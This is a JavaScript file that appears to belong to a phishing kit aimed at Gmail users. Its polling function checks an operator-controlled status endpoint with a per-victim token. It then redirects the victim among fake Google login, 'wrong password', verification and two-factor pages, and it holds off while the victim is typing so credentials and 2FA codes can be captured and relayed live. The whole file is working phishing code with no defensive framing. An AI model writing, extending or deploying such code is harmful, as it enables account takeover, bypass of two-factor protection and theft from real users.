var GM_POLL_INTERVAL_SECONDS = 4;

function gmCheckStatus(token, options) {
    options = options || {};
    var holdStatuses = options.holdStatuses || ['gm_hold', 'hold', 'continue', ''];
    var pageStatus = options.pageStatus || null;
    var intervalMs = (options.intervalSeconds != null ? options.intervalSeconds : GM_POLL_INTERVAL_SECONDS) * 1000;
    var lastStatus = pageStatus || null;
    var userIsTyping = false;
    var typingTimer = null;

    var map = {
        gm_verify: 'gmail_verify.php?token=' + token,
        gm_login: 'gmail_login.php?token=' + token,
        gm_wrong_pass: 'gmail_login.php?token=' + token + '&w=1',
        gm_2fa_device: 'gmail_2fa.php?token=' + token + '&mode=device',
        gm_2fa_pick: 'gmail_2fa.php?token=' + token + '&mode=pick',
        break: 'break.php?token=' + token,
        pwd: 'login.php?token=' + token,
        code: 'code.php?token=' + token,
        continue: 'continue.php?token=' + token
    };

    function normalizeUrl(url) {
        try {
            var a = document.createElement('a');
            a.href = url;
            return (a.pathname.split('/').pop() || '') + a.search;
        } catch (e) {
            return url;
        }
    }

    function isCurrentPage(target) {
        return normalizeUrl(window.location.href) === normalizeUrl(target);
    }

    function targetForStatus(status) {
        if (status === 'gm_hold') {
            var on2faWait = window.location.pathname.indexOf('gmail_2fa_POST.php') !== -1;
            return on2faWait
                ? 'gmail_2fa_POST.php?token=' + token + '&waiting=1'
                : 'gmail_login_POST.php?token=' + token + '&waiting=1';
        }
        return map[status] || null;
    }

    function shouldHold(status) {
        if (pageStatus && status === pageStatus) {
            return true;
        }
        return holdStatuses.indexOf(status) !== -1;
    }

    function redirectFor(status) {
        if (shouldHold(status)) {
            lastStatus = status;
            return;
        }

        if (status === lastStatus) {
            return;
        }

        var target = targetForStatus(status);
        if (!target || isCurrentPage(target)) {
            lastStatus = status;
            return;
        }

        lastStatus = status;
        window.location.href = target;
    }

    function poll() {
        if (userIsTyping) {
            return;
        }

        if (document.activeElement && /^(INPUT|TEXTAREA|SELECT)$/.test(document.activeElement.tagName)) {
            return;
        }

        fetch('gmail_STATUS.php?token=' + encodeURIComponent(token))
            .then(function (response) { return response.text(); })
            .then(function (data) {
                redirectFor(data.trim());
            })
            .catch(function (err) { console.error('Error:', err); });
    }

    function markTyping() {
        userIsTyping = true;
        if (typingTimer) {
            clearTimeout(typingTimer);
        }
        typingTimer = setTimeout(function () {
            userIsTyping = false;
        }, 1500);
    }

    document.addEventListener('input', markTyping, true);
    document.addEventListener('focusin', function (e) {
        if (e.target && /^(INPUT|TEXTAREA|SELECT)$/.test(e.target.tagName)) {
            userIsTyping = true;
        }
    }, true);
    document.addEventListener('focusout', function (e) {
        if (e.target && /^(INPUT|TEXTAREA|SELECT)$/.test(e.target.tagName)) {
            markTyping();
        }
    }, true);

    setTimeout(poll, intervalMs);
    setInterval(poll, intervalMs);
}
